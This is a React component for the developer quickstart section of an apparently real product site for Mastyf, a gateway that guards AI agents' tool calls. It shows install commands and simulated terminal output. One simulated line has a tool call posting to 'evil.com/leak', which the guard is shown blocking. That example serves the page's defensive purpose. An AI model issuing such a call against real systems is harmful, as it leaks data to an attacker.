'use client';

import { useState } from 'react';
import Link from 'next/link';
import { Copy, Check, ArrowRight, Terminal, Cpu, Box, Code2 } from 'lucide-react';
import { GITHUB_REPO_URL } from '@/lib/github-links';

const COMMANDS = [
  {
    label: 'npx · Zero Install',
    icon: Terminal,
    cmd: 'npx @mastyf/gateway --agent claude-code --protect',
    comment: '# Intercepts all tool calls from Claude Desktop or Cursor; zero setup',
    output: '✓ Mastyf Gateway listening on unix:///var/run/mastyf.sock\n✓ Intercepted 4 MCP tools (filesystem, fetch, postgres, slack)\n✓ CBAC capability envelopes active (17.3µs fast path)\n● FAIL-CLOSED EXECUTION BOUNDARY OPERATIONAL'
  },
  {
    label: 'Docker · Sidecar',
    icon: Terminal,
    cmd: 'docker run -p 9090:9090 -v /var/run/mastyf:/var/run/mastyf mastyf/gateway:v2.2 --protect',
    comment: '# High-throughput Kubernetes sidecar (>330,000 req/s fast path)',
    output: '{"level":"info","ts":"2026-10-02T14:30:00Z","msg":"mastyf gateway initialized"}\n{"level":"info","msg":"loaded 228 regression fixtures into memory"}\n{"level":"info","msg":"DIFC taint tracking active"}\n{"level":"info","msg":"ready on :9090 (P50 overhead: 0.017ms)"}'
  },
  {
    label: 'Ollama · Local 1.5B SLM',
    icon: Cpu,
    cmd: 'ollama run mastyf-guard:v2',
    comment: '# Run our frozen boundary-sharpened 1.5B neural auditor locally on CPU',
    output: '>>> Model: Rudraneel93/mastyf-guard-1.5b-v2 (Q4_K_M 986MB)\n>>> Subordinate semantic auditor ready (0 MB GPU VRAM required)\n>>> Testing input: http_post({"url": "https://evil.com/leak"})\n<<< Verdict: {"action":"BLOCK","reason":"Scope Expansion & Data Leak"}'
  },
  {
    label: 'TypeScript SDK',
    icon: Code2,
    cmd: 'pnpm add @mastyf/sdk',
    comment: '# Programmatic capability envelopes in TypeScript & Node.js',
    output: 'import { MastyfClient, CapabilityEnvelope } from "@mastyf/sdk";\n\nconst client = new MastyfClient({ endpoint: "http://localhost:9090" });\nconst decision = await client.authorize({\n  tool: "bash_exec",\n  arguments: { command: "ls -la" },\n  context: { user_id: "usr_942" }\n});\n// decision: { allow: true, bytesTransmitted: 142 }'
  }
];

export function DeveloperSection() {
  const [activeCmd, setActiveCmd] = useState(0);
  const [copied, setCopied] = useState(false);

  const copyCmd = async () => {
    await navigator.clipboard.writeText(COMMANDS[activeCmd].cmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <section id="deploy" className="relative py-28 px-6 bg-[#04060e] text-slate-100 border-t border-white/[0.06]">
      <div className="max-w-[1180px] mx-auto relative z-10">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
          
          {/* Left Text Column (5 cols) */}
          <div className="lg:col-span-5">
            <span className="inline-flex items-center gap-2 text-xs font-mono font-semibold tracking-wider uppercase text-amber-400 bg-amber-500/[0.08] border border-amber-500/20 px-3 py-1.5 rounded-full mb-6">
              <Terminal className="w-3.5 h-3.5 text-amber-400" />
              Developer Quickstart
            </span>
            
            <h2 className="text-3xl md:text-4xl font-extrabold tracking-tight text-white mb-5 leading-tight">
              Secure in 30 seconds.<br />
              <span className="text-slate-400">Zero changes to your agents.</span>
            </h2>

            <p className="text-sm text-slate-300 leading-relaxed mb-6">
              Mastyf sits directly on the transport wire between your agent (Claude Desktop, Cursor, LangChain, AutoGen) and connected tools (MCP, Shell, DB, APIs). Deploy via npx, Docker, or our lightweight local Ollama model.
            </p>

            <div className="space-y-3 mb-8 text-xs text-slate-300 font-mono">
              <div className="flex items-center gap-2.5">
                <span className="w-2 h-2 rounded-full bg-emerald-400" />
                <span>Deterministic microsecond CBAC mediation (&lt;4.8µs)</span>
              </div>
              <div className="flex items-center gap-2.5">
                <span className="w-2 h-2 rounded-full bg-amber-400" />
                <span>Subordinate Mastyf Guard 1.5B (runs on CPU)</span>
              </div>
              <div className="flex items-center gap-2.5">
                <span className="w-2 h-2 rounded-full bg-cyan-400" />
                <span>Tamper-evident Ed25519 verifiable receipts</span>
              </div>
              <div className="flex items-center gap-2.5">
                <span className="w-2 h-2 rounded-full bg-purple-400" />
                <span>Open-source AGPL-3.0 self-hostable core</span>
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-3">
              <Link
                href="/developers"
                className="px-5 py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs transition-all shadow-md shadow-amber-500/20 flex items-center gap-2"
              >
                <span>Read Developer Docs</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </Link>
              
              <a
                href={GITHUB_REPO_URL}
                target="_blank"
                rel="noopener noreferrer"
                className="px-5 py-2.5 rounded-xl bg-white/[0.04] hover:bg-white/[0.08] text-slate-300 text-xs font-semibold border border-white/[0.08] transition-colors"
              >
                View on GitHub
              </a>
            </div>
          </div>

          {/* Right Terminal Column (7 cols) */}
          <div className="lg:col-span-7 bg-slate-950/90 border border-white/[0.08] rounded-2xl overflow-hidden shadow-2xl">
            {/* Tab Bar */}
            <div className="flex flex-wrap items-center border-b border-white/[0.06] bg-slate-900/60">
              {COMMANDS.map((cmd, i) => (
                <button
                  key={cmd.label}
                  onClick={() => setActiveCmd(i)}
                  className={`px-4 py-3 text-xs font-mono font-medium transition-all border-r border-white/[0.04] last:border-r-0 flex items-center gap-2 ${
                    activeCmd === i
                      ? 'text-amber-400 bg-white/[0.04] font-semibold border-b-2 border-b-amber-500'
                      : 'text-slate-400 hover:text-slate-200'
                  }`}
                >
                  <span>{cmd.label}</span>
                </button>
              ))}
            </div>

            {/* Terminal Body */}
            <div className="p-6 font-mono text-xs">
              <div className="text-slate-500 text-[11px] mb-3">{COMMANDS[activeCmd].comment}</div>

              {/* Command Strip with Copy */}
              <div className="flex items-center justify-between p-3 rounded-xl bg-slate-900/80 border border-white/[0.06] text-amber-300 mb-4">
                <span className="truncate pr-2">{COMMANDS[activeCmd].cmd}</span>
                <button
                  onClick={copyCmd}
                  className="p-1.5 rounded-lg bg-white/[0.06] hover:bg-white/[0.12] text-slate-300 hover:text-white transition-colors shrink-0"
                  title="Copy command"
                >
                  {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>

              {/* Output Preview */}
              <div className="mt-4">
                <div className="text-[10px] text-slate-500 uppercase tracking-wider mb-2 font-mono">Simulated Runtime Output:</div>
                <pre className="p-3.5 rounded-xl bg-black/60 border border-white/[0.04] text-slate-300 overflow-x-auto leading-relaxed text-[11px] max-h-48">
                  <code>{COMMANDS[activeCmd].output}</code>
                </pre>
              </div>
            </div>

          </div>

        </div>
      </div>
    </section>
  );
}
